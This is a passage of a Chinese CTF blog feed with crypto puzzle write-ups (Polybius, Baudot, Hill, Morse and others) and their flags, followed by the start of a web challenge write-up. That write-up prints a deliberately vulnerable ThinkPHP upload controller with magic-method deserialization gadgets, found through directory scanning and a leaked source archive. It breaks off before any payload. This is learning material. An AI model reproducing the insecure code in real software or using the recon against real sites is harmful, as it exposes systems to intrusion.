class="hljs-regexp">/xKXVrufRdX8P2ulA5hF4HDouBncdhHXPesnStf8AHWnfEPQdG8T6hpF3aaqk0itp6E5VIyw+YqO+Oma9J1LTrXV9MuNP1GLzrW5Qxyx7iu5T1GQQR+FcNq2gy2nxT8EDS9PuP7M061uITIiM8cC+UVQM/</span>OOwGTk04aSSf9aP<span class="hljs-regexp">/gBLWLZq/</span>E<span class="hljs-regexp">/xFqHhbwNcappDRpdRyxopkTcMMwB4rDFh8YmUEax4Z5GfuSf/</span>AButD4xafe6p8N7q2020nvLhp4SIreJpHIDgk4AzXcJxGufQUktG<span class="hljs-regexp">/P8ARDluvT9TP8PR6zFocCeJprWfUxu86S0BEZ+Y7cZAP3cdutcvrll8TpNauX8P6noMWmlv3CXKuZFGB97CEdc967qih6u4uljy7Ttc8e6T8R9D0PxZe6VcW+prM2LKM5ARCeSVGOcV3niSLXZtFkTwrPaQaluXY94CYwM/</span>NnAJ6e1cx4k069n+MfhC9gs7iS0t4boTTpExjiJjIG5gMDPbNd5T3ivn+bB6S+<span class="hljs-number">48</span>umX4swGVW17wsZYojK0Sh9+<span class="hljs-number">0</span>d8eXXU<span class="hljs-regexp">/DfXr7xN4A0/</span>VtVZGurjzN5jXaPlkZRx9AKv33h7Tv7QvdbitCdVlsWtTMHYlo+oXbnHUDnGaxfhJY3em<span class="hljs-regexp">/C/</span>SrXUbWa0uI<span class="hljs-regexp">/N3wzxlHXMrkZU8jgg0R2fy/</span>X<span class="hljs-regexp">/gBLpb+tDs65DXPEeoWHxO8NaHbtGLLUorhrhSmWJRCVwe3NVNc+ImpaRrVzYQeB9e1COBtq3Vtbs0cnAOVIX3xXOW2r6x4t+LnhnUZfCes6Ta2Edwkst5bOq/</span>NG2Pm2gDnj8aI6yXbX8mD0iz13NFZniHRjrujyWcd3NYzblkguYDhopFOVb3Geo7jIrjf+En8czynw4PDjwatjy31sgmyVe8y8cnHITPXg9MVPkHmei5z0oznpWfoWkJoWiwaelxNdGPczzztueV2YszE+pYk1zOuLrnhHVrnXNEtbjW9NvGDXmlRktLFJgASw9cg4G5fx9cN2TDc7bNGa4zQINb8Taxb+I<span class="hljs-regexp">/EEM+k2lsD/</span>Z+kMSHBKlTLN<span class="hljs-regexp">/tYJAXsD610HiHRjrujyWcd3NYzblkguYDhopFOVb3Geo7jIoeiDRl8XMBuTbiaMzhdxi3jcB6464qTOeleUpceJ5PFEkUfhN7fxQ9t9il8RFnNkIQQfMVfuk9CF654PGRXo2haQmhaLBp6XE10Y9zPPO255XZizMT6liTR0uHkec3fiDx7q3jbxHp3hzUtGs7LR5IwzaghXAdcj5gp9D1x2rd8N23xH/</span>ti1n8QaroN1pJBMgsg+<span class="hljs-number">9</span>wVO0qSgHXB69K469ub7RvHHjSG+<span class="hljs-number">8</span>F61rem600SbrS3kCMqoQfmUd93UHtXWeEPGdzc3mn6DF4G1zR7JI<span class="hljs-regexp">/Kjnu4XEcKoh2gsw/</span><span class="hljs-number">2</span>QOT1NOGyt2X5ahPdmh8T<span class="hljs-regexp">/EWoeFvA1xqmkNGl1HLGimRNwwzAHiufWH4tvceQuveFfO2bzFh9wX1x5ecVqfGLT73VPhvdW2m2k95cNPCRFbxNI5AcEnAGa6eHQNNj1868LbGpvbC2afzG5jyDt2529R1xmlFaNvv+i/</span>Ucunp+ovh6PWYtDgTxNNaz6mN3nSWgIjPzHbjIB+<span class="hljs-number">7</span>jt1rl9csvidJrVy<span class="hljs-regexp">/h/</span>U9Bi00t+<span class="hljs-number">4</span>S5VzIowPvYQjrnvXdVwuufETUtI1q5sIPA+vahHA21bq2t2aOTgHKkL74obuxdDI07XPHuk<span class="hljs-regexp">/EfQ9D8WXulXFvqazNiyjOQEQnklRjnFeo15FbavrHi34ueGdRl8J6zpNrYR3CSy3ls6r80bY+baAOePxr12q+yvn+bE/i</span>08goooqRhRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQBD9kj<span class="hljs-regexp">/vTf9/</span>n<span class="hljs-regexp">/wAaPskf96b/</span>AL<span class="hljs-regexp">/P/</span>jRRQAfZI<span class="hljs-regexp">/703/</span>f5<span class="hljs-regexp">/wDGj7JH/</span>em<span class="hljs-regexp">/7/</span>P<span class="hljs-regexp">/AI0UUAH2SP8AvTf9/</span>n<span class="hljs-regexp">/xo+yR/</span>wB6b<span class="hljs-regexp">/v8/</span>wDjRRQAfZI<span class="hljs-regexp">/703/</span>AH+f<span class="hljs-regexp">/Gj7JH/</span>em<span class="hljs-regexp">/7/</span>AD<span class="hljs-regexp">/40UUAH2SP+9N/</span><span class="hljs-number">3</span>+f<span class="hljs-regexp">/ABo+yR/</span><span class="hljs-number">3</span>pv8Av8<span class="hljs-regexp">/+NFFAB9kj/</span>vTf9<span class="hljs-regexp">/n/</span>AMaPskf96b<span class="hljs-regexp">/v8/</span><span class="hljs-number">8</span>AjRRQAfZI<span class="hljs-regexp">/wC9N/</span><span class="hljs-number">3</span>+f<span class="hljs-regexp">/Gj7JH/</span>AHpv+<span class="hljs-regexp">/z/</span>AONFFAB9kj<span class="hljs-regexp">/vTf8Af5/</span><span class="hljs-number">8</span>aPskf96b<span class="hljs-regexp">/v8AP/</span>jRRQAfZI<span class="hljs-regexp">/703/</span>f5<span class="hljs-regexp">/8AGj7JH/</span>em<span class="hljs-regexp">/wC/</span>z<span class="hljs-regexp">/40UUAH2SP+9N/</span><span class="hljs-number">3</span>+f8Axo+yR<span class="hljs-regexp">/3pv+/</span>z<span class="hljs-regexp">/wCNFFAB9kj/</span>AL03<span class="hljs-regexp">/f5/</span><span class="hljs-number">8</span>aPskf8Aem<span class="hljs-regexp">/7/</span>P8A40UUAH2SP+<span class="hljs-number">9</span>N<span class="hljs-regexp">/wB/</span>n<span class="hljs-regexp">/xo+yR/</span><span class="hljs-number">3</span>pv+<span class="hljs-regexp">/wA/</span>+NFFAB9kj<span class="hljs-regexp">/vTf9/</span>n<span class="hljs-regexp">/wAaPskf96b/</span>AL<span class="hljs-regexp">/P/</span>jRRQAfZI<span class="hljs-regexp">/703/</span>f5<span class="hljs-regexp">/wDGj7JH/</span>em<span class="hljs-regexp">/7/</span>P<span class="hljs-regexp">/AI0UUAH2SP8AvTf9/</span>n<span class="hljs-regexp">/xo+yR/</span>wB6b<span class="hljs-regexp">/v8/</span>wDjRRQAfZI<span class="hljs-regexp">/703/</span>AH+f<span class="hljs-regexp">/Gj7JH/</span>em<span class="hljs-regexp">/7/</span>AD<span class="hljs-regexp">/40UUAH2SP+9N/</span><span class="hljs-number">3</span>+f<span class="hljs-regexp">/ABo+yR/</span><span class="hljs-number">3</span>pv8Av8<span class="hljs-regexp">/+NFFAB9kj/</span>vTf9<span class="hljs-regexp">/n/</span>AMaPskf96b<span class="hljs-regexp">/v8/</span><span class="hljs-number">8</span>AjRRQAfZI<span class="hljs-regexp">/wC9N/</span><span class="hljs-number">3</span>+f<span class="hljs-regexp">/Gj7JH/</span>AHpv+<span class="hljs-regexp">/z/</span>AONFFAB9kj<span class="hljs-regexp">/vTf8Af5/</span><span class="hljs-number">8</span>aPskf96b<span class="hljs-regexp">/v8AP/</span>jRRQAfZI<span class="hljs-regexp">/703/</span>f5<span class="hljs-regexp">/8AGj7JH/</span>em<span class="hljs-regexp">/wC/</span>z<span class="hljs-regexp">/40UUAH2SP+9N/</span><span class="hljs-number">3</span>+f8Axo+yR<span class="hljs-regexp">/3pv+/</span>z<span class="hljs-regexp">/wCNFFAB9kj/</span>AL03<span class="hljs-regexp">/f5/</span><span class="hljs-number">8</span>aPskf8Aem<span class="hljs-regexp">/7/</span>P8A40UUAH2SP+<span class="hljs-number">9</span>N<span class="hljs-regexp">/wB/</span>n<span class="hljs-regexp">/xooooA/</span><span class="hljs-number">9</span>k=<br></code></pre></td></tr></table></figure><p>一堆牛马乱码，没见过，看别人wp知道是base64转图片，还要加图片头data:image/jpg;base64</p><p>之后对照表就行了</p><h1 id="你喜欢下棋吗"><a href="#你喜欢下棋吗" class="headerlink" title="你喜欢下棋吗"></a>你喜欢下棋吗</h1><p><img src="https://img-blog.csdnimg.cn/2021011716212098.png" alt="波利比奥斯方阵密码（棋盘"></p><p> <strong>4423244324433534315412244543</strong>先横后竖转换得到”thisispolybius”</p><p>打开是这个</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">一种<span class="hljs-number">5</span>bit的编码<br>bugku里面的内容为小写<br>bugku&#123;<span class="hljs-number">11111 11001</span> <span class="hljs-number">00011 00111</span> <span class="hljs-number">01001 11011</span> <span class="hljs-number">10110 11111</span> <span class="hljs-number">10000 01110</span> <span class="hljs-number">11011 10110</span> <span class="hljs-number">11111 01001</span> <span class="hljs-number">00001</span>&#125;<br><br></code></pre></td></tr></table></figure><p>Baudot Code</p><p><a href="https://www.boxentriq.com/code-breaking/baudot-code%E8%A7%A3%E7%A0%81%E5%8D%B3%E5%8F%AF">https://www.boxentriq.com/code-breaking/baudot-code解码即可</a></p><h1 id="小山丘的秘密"><a href="#小山丘的秘密" class="headerlink" title="小山丘的秘密"></a>小山丘的秘密</h1><p>给了一个图片</p><p><img src="/2021/10/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98/image-20211015095600891.png" alt="棋盘"></p><p>还有一段话</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">bugku</span><span class="hljs-template-variable">&#123;PLGTGBQHM&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">其中A=1，flag全为小写bugku</span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></td></tr></table></figure><p>hill（希尔密码）</p><p><img src="/2021/10/14/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%B7%E9%A2%98/image-20211015100055646.png" alt="解密网站"></p><p>需要三个参数，首先A=1就是提示字母表排列 一般从0开始 所以z就是0</p><p>第二个也就是加密的内容 </p><p>第三个参数从棋盘上看 第一个也就是a 以此类推</p><p>就解除了答案</p><p>bugku{whatahill}</p><h1 id="EN-气泡"><a href="#EN-气泡" class="headerlink" title="EN-气泡"></a>EN-气泡</h1><p>上脚本就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bubblepy <span class="hljs-keyword">import</span> BubbleBabble<br><span class="hljs-comment">#导入包bubblepy</span><br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;xivak-notuk-cupad-tarek-zesuk-zupid-taryk-zesak-cined-tetuk-nasuk-zoryd-tirak-zysek-zaryd-tyrik-nisyk-nenad-tituk-nysil-hepyd-tovak-zutik-cepyd-toral-husol-henud-titak-hesak-nyrud-tarik-netak-zapad-tupek-hysek-zuned-tytyk-zisuk-hyped-tymik-hysel-hepad-tomak-zysil-nunad-tytak-nirik-copud-tevok-zasyk-nypud-tyruk-niryk-henyd-tityk-zyral-nyred-taryk-zesek-corid-tipek-zysek-nunad-tytal-hitul-hepod-tovik-zurek-hupyd-tavil-hesuk-zined-tetuk-zatel-hopod-tevul-haruk-cupod-tavuk-zesol-ninid-tetok-nasyl-hopid-teryl-nusol-heped-tovuk-hasil-nenod-titek-zyryl-hiped-tivyk-cosok-zorud-tirel-hyrel-hinid-tetok-hirek-zyped-tyrel-hitul-nyrad-tarak-hotok-cuvux&#x27;</span><br><span class="hljs-comment">#str是待解密字符</span><br>Str=BubbleBabble()<br><span class="hljs-built_in">print</span>(Str.decode(<span class="hljs-built_in">str</span>))<br><br></code></pre></td></tr></table></figure><p>多次套娃</p><h1 id="你以为是md5吗"><a href="#你以为是md5吗" class="headerlink" title="你以为是md5吗"></a>你以为是md5吗</h1><p>bci177a7a9c7udf69c248647b4dfc6fd84o</p><p>给了一串数字，其实就是考察对md5的理解 ctf中md5一般为32位小写字符 由[a-f][0-9]构成</p><p>删去i o u  再去解密 就可以了 </p><p>bc177a7a9c7df69c248647b4dfc6fd84</p><p>flag{666666666666}</p><h1 id="Math-amp-English"><a href="#Math-amp-English" class="headerlink" title="Math&amp;English"></a>Math&amp;English</h1><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-number">11</span>×<span class="hljs-number">3</span><span class="hljs-operator">=</span><br><span class="hljs-variable">sin</span><span class="hljs-punctuation">(</span>Π<span class="hljs-operator">/</span><span class="hljs-number">6</span><span class="hljs-punctuation">)</span><span class="hljs-operator">+</span><span class="hljs-variable">sin</span><span class="hljs-punctuation">(</span>Π<span class="hljs-operator">/</span><span class="hljs-number">6</span><span class="hljs-punctuation">)</span><span class="hljs-operator">=</span>                  <br><span class="hljs-number">2</span>×<span class="hljs-number">11</span><span class="hljs-operator">=</span><br><span class="hljs-number">3</span>×<span class="hljs-variable">cos</span><span class="hljs-punctuation">(</span><span class="hljs-number">2</span>Π<span class="hljs-punctuation">)</span><span class="hljs-operator">=</span><br><span class="hljs-number">22</span>×<span class="hljs-number">2</span><span class="hljs-operator">=</span><br><span class="hljs-number">6</span>×<span class="hljs-number">9</span><span class="hljs-operator">=</span><br><span class="hljs-number">2.5</span>×<span class="hljs-number">2</span><span class="hljs-operator">=</span><br><span class="hljs-variable">tan</span><span class="hljs-punctuation">(</span>Π<span class="hljs-punctuation">)</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <br><span class="hljs-number">5</span>×<span class="hljs-number">7</span><span class="hljs-operator">=</span><br><span class="hljs-number">7</span>×<span class="hljs-number">9</span><span class="hljs-operator">-</span><span class="hljs-number">9</span><span class="hljs-operator">=</span><br><span class="hljs-variable">ln</span><span class="hljs-punctuation">(</span><span class="hljs-variable">e</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">+</span> <span class="hljs-number">2</span> <span class="hljs-operator">=</span><br><span class="hljs-punctuation">(</span><span class="hljs-number">6</span>×<span class="hljs-number">6</span><span class="hljs-punctuation">)</span><span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><br><span class="hljs-number">4</span>×<span class="hljs-number">10</span> <span class="hljs-operator">+</span> <span class="hljs-variable">cos</span><span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">=</span><br><span class="hljs-number">26</span>×<span class="hljs-number">2</span> <span class="hljs-operator">=</span><br><span class="hljs-variable">ln</span><span class="hljs-punctuation">(</span><span class="hljs-variable">e</span><span class="hljs-punctuation">)</span> × <span class="hljs-number">10</span> <span class="hljs-operator">+</span><span class="hljs-number">3</span> <span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>通过计算 得到了</p><p>21 33 1 22 3 44 54 5 1 35 54 3 35 41 52 13</p><p>为元音密码</p><p><img src="https://img-blog.csdnimg.cn/1ec2d1c05be842d88acf36f9cb5b4e62.png" alt="元音密码对照表"></p><p>对照即可解出密码</p><h1 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h1><p>0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101 </p><p>猜想是摩斯密码 转换后</p><p>..-. .-.. .- –. —-.– – —– .-. … . ..–.- -.-. — -.. . ..–.- .—- … ..–.- .. -. - . .-. . … - .—- -. —-. -.-.– —–.-</p><p><a href="http://www.hiencode.com/morse.html">http://www.hiencode.com/morse.html</a></p><p>解密即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯upload</title>
    <link href="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"/>
    <url>/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/</url>
    
    <content type="html"><![CDATA[<p>登入以后首先是个页面<img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010112902210.png" alt="登入界面"></p><p>注册一个账号去登入</p><p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/image-20211010113008567.png"></p><p>弹出了这个，好熟悉，thinkphp</p><p><img src="/2021/10/10/%E5%BC%BA%E7%BD%91%E6%9D%AFupload/20211010113045948.png"></p><p>登入之后是个文件上传的页面，尝试去上传一个php，发现不好使，(中间出现了一次报错，爆出了版本为5.1.35，去网上搜了exp，但是没有反序列化入口) 只能上传图片，用dirseach扫目录，发现是源码泄露</p><p><a href="http://www.tar.gz/">www.tar.gz</a></p><p>下载下来源码，进行审计，发现为mvc三层架构，去审计控制器里的源码</p><p>因为题目名字叫upload，那应该就是文件上传喽，先审profile里的代码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">web</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker=<span class="hljs-keyword">new</span> Index();<br>        <span class="hljs-keyword">$this</span>-&gt;upload_menu=md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>        @chdir(<span class="hljs-string">&quot;../public/upload&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-keyword">$this</span>-&gt;upload_menu))&#123;<br>            @mkdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>        &#125;<br>        @chdir(<span class="hljs-keyword">$this</span>-&gt;upload_menu);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;filename_tmp=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;filename=md5(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;ext_check();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext) &#123;<br>            <span class="hljs-keyword">if</span>(getimagesize(<span class="hljs-keyword">$this</span>-&gt;filename_tmp)) &#123;<br>                @copy(<span class="hljs-keyword">$this</span>-&gt;filename_tmp, <span class="hljs-keyword">$this</span>-&gt;filename);<br>                @unlink(<span class="hljs-keyword">$this</span>-&gt;filename_tmp);<br>                <span class="hljs-keyword">$this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-subst">$this</span>-&gt;upload_menu/<span class="hljs-subst">$this</span>-&gt;filename&quot;</span>;<br>                <span class="hljs-keyword">$this</span>-&gt;update_img();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$user_info</span>=db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&quot;ID&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;find();<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;img)&#123;<br>            <span class="hljs-keyword">if</span>(db(<span class="hljs-string">&#x27;user&#x27;</span>)-&gt;where(<span class="hljs-string">&#x27;ID&#x27;</span>,<span class="hljs-variable">$user_info</span>[<span class="hljs-string">&#x27;ID&#x27;</span>])-&gt;data([<span class="hljs-string">&quot;img&quot;</span>=&gt;addslashes(<span class="hljs-keyword">$this</span>-&gt;img)])-&gt;update())&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;update_cookie();<br>                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;Upload img successful!&#x27;</span>, url(<span class="hljs-string">&#x27;../home&#x27;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;Upload file failed!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_cookie</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile[<span class="hljs-string">&#x27;img&#x27;</span>]=<span class="hljs-keyword">$this</span>-&gt;img;<br>        cookie(<span class="hljs-string">&quot;user&quot;</span>,base64_encode(serialize(<span class="hljs-keyword">$this</span>-&gt;checker-&gt;profile)),<span class="hljs-number">3600</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ext_check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$ext_arr</span>=explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-keyword">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">$this</span>-&gt;ext=end(<span class="hljs-variable">$ext_arr</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;ext==<span class="hljs-string">&quot;png&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>一个大类，重点关注upload_img方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_img</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;checker)&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;checker-&gt;login_check())&#123;<br>                <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span 